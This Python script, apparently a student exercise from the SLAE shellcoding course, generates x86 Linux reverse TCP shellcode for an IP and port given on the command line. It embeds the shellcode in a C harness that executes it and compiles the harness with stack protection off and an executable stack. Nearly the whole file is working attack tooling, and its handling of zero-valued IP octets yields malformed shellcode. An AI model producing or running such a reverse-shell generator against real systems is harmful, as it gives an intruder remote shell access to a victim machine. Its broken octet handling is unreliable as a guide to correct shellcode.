#!/usr/bin/python

# Filename: getReverseShell.py
# Author: Jonathan So
# Student ID: SLAE-1470
# SLAE-Exercise 2

import sys
import os
import getopt

def usage():
	print('getReverseShell.py -p port | -h help')	

def main(argv):
	port = 0
	ip = ''
	hexPort = ''
	hexIP = ''
	if(len(sys.argv) < 2):
		usage()
		sys.exit()
	try:
		opts,args = getopt.getopt(sys.argv[1:], "hp:i:", ["help", "port=", "ip="])
	except getopt.GetoptError:
		usage()
		sys.exit(2)
	for opt, arg in opts:
		if opt in ("-h", "--help"):
			usage()
			sys.exit()
		elif opt in ("-p", "--port"):
			port = int(arg)
			if port < 1 or port > 65535:
				print('Error port!')
				sys.exit(2)
			print('Port: ' + str(port))
		elif opt in ("-i", "--ip"):
			ip = arg
			print('IP address: ' + ip)
			hexIP = ip.split(".")
			if len(hexIP) != 4:
				print('Invalid IP')
				sys.exit(2)
			for x in hexIP:
				if not x.isdigit():
					print('Invalid IP')
					sys.exit(2)
				if int(x) < 0 or int(x) > 255:
					print('Invalid IP')
					sys.exit(2)
	if ip == '' or port == 0:
		print('Missing IP/Port')
		sys.exit(2)
	hexPort = str(hex(port))[2::]
	if len(hexPort) <4:
		hexPort = '0'+hexPort
	print('Port in hex: ' + hexPort)
	hexIPpart = []
	for i in range(4):
		hexIPpart.append(str(hex(int(hexIP[i])))[2::])

	for i in range(4):
		if len(hexIPpart[i]) <2:
			hexIPpart[i] = '0' + hexIPpart[i]
		if hexIPpart[i] == '00':
			hexIPpart[i] = ''

	print('IP in hex: ' + str(hexIPpart) )

	hexPort = "\\x" + hexPort[0:2] + "\\x" + hexPort[2:]
	
	Shellcode = "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80"
	Shellcode += "\\x89\\xc6\\x31\\xdb\\xb3\\x03"
	Shellcode += "\\xb2\\x" + hexIPpart[3]
	Shellcode += "\\xc1\\xe2\\x08"
	Shellcode += "\\xb2\\x" + hexIPpart[2]
	Shellcode += "\\xc1\\xe2\\x08"
	Shellcode += "\\xb2\\x" + hexIPpart[1]
	Shellcode += "\\xc1\\xe2\\x08"
	Shellcode += "\\xb2\\x" + hexIPpart[0]
	Shellcode += "\\x52\\x66\\x68"
	Shellcode += hexPort
	Shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89"
	Shellcode += "\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x87\\xf3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
	Shellcode += "\\x80\\x49\\x79\\xf9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"
	Shellcode += "\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
	
	print("Shellcode:")
	print(Shellcode)

	filename="RShell-" + ip + "-" + str(port) + ".c"
	print("Saving to " + filename)
 
	content = "#include<stdio.h>\n"
	content += "#include<string.h>\n"
	content += "unsigned char code[] = \\\n"
	content += "\"" + Shellcode + "\";\n"
	content += "int main(){\n"
	content += "	printf(\"Shellcode Length:  %d\\n\", strlen(code));\n"
	content += "	int (*ret)() = (int(*)())code;\n"
	content += "	ret();}\n"
  
	textfile = open(filename , 'w')
	textfile.write(content)
	textfile.close()

	os.system("gcc -m32 -fno-stack-protector -z execstack " + filename +" -o " + filename[:-2])

if __name__ == '__main__':
	main(sys.argv[1:])
